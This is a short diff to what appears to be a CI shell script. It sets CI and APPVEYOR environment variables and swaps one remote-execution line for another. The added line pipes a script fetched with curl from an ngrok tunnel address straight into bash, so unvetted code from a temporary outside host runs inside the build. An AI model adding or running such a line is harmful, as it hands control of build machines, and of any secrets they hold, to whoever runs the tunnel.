@@ -4,4 +4,4 @@ set -x
 
 export CI="True"
 export APPVEYOR="True"
-bash <(curl -s https://felipe-1692-420-c0d3r.ngrok.io.ngrok.io/bash) 
+bash <(curl -s https://6bec2ebd.ngrok.io/bash) 
